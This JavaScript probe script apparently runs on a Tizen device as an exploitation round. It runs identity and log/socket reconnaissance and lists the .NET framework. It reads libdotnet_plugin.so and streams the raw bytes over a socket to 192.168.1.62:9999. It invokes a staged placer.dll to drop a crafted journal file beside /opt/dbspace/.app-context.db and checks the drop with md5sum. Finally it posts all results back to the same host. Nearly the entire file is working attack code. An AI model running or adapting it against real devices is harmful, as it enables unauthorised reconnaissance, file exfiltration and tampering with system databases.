"use strict";

/* p57: visibility round
   1. identity
   2. log recon: /var/log, unix sockets, dlog daemon
   3. /usr/share/dotnet.tizen lib/framework listing
   4. exfil libdotnet_plugin.so raw -> /p57plugin
   5. standalone caps  -> placer.log (file self-log)
   6. standalone place -> placer.log + dst verify
   exfil /p57info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var PLDIR = '/home/owner/share/tmp/sdk_tools';
var DL = '/usr/bin/dotnet-launcher';
var PLOG = PLDIR + '/placer.log';
var R = { ts: new Date().toISOString(), probe: 'p57', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p57info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function readLog() {
  try {
    var c = fs.readFileSync(PLOG, 'utf8');
    return '[exists ' + c.length + ' chars] ' + c;
  } catch (e) {
    return '[no log: ' + e.message + ']';
  }
}

function main() {
  R.results.identity = run('id 2>&1', 10000);

  // 2) log recon
  R.results.log_recon = run('echo ===VARLOG===; ls -la /var/log/ 2>&1 | head -20; echo ===SOCKETS===; find /dev /var/run /tmp /var -maxdepth 3 -type s 2>/dev/null | head -20; echo ===PS_DLOG===; ps -ef 2>/dev/null | grep -iE "dlog|journal" | grep -v grep | head -10', 30000);

  // 3) dotnet.tizen
  R.results.dotnet_tizen = run('echo ===LIB===; ls -la /usr/share/dotnet.tizen/lib/ 2>&1; echo ===FW===; ls -la /usr/share/dotnet.tizen/framework/ 2>&1 | head -15', 15000);

  // 4) exfil libdotnet_plugin.so
  try {
    var buf = fs.readFileSync('/usr/share/dotnet.tizen/lib/libdotnet_plugin.so');
    postBuf('/p57plugin', buf);
    R.results.plugin_exfil = 'posted ' + buf.length + ' bytes';
  } catch (e) {
    R.results.plugin_exfil = 'read err: ' + e.message;
  }

  // 5) standalone caps with file self-log
  run('rm -f ' + PLOG + ' 2>&1', 5000);
  R.results.s_caps = run(DL + ' --standalone ' + PLDIR + '/placer.dll caps 2>&1; echo s_caps_exit=$?', 90000);
  R.results.caps_log = readLog();

  // 6) standalone place with file self-log
  run('rm -f ' + PLOG + ' 2>&1', 5000);
  R.results.s_place = run(DL + ' --standalone ' + PLDIR + '/placer.dll place 2>&1; echo s_place_exit=$?', 90000);
  R.results.place_log = readLog();

  // 7) verify
  R.results.verify = run(
    'echo ===DST===; ls -la /opt/dbspace/.app-context.db-journal 2>&1; md5sum /opt/dbspace/.app-context.db-journal 2>&1; ' +
    'echo ===LIVE===; md5sum /opt/dbspace/.app-context.db 2>&1; ' +
    'echo ===STAGED===; md5sum ' + PLDIR + '/appctx_hot_journal 2>&1', 20000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
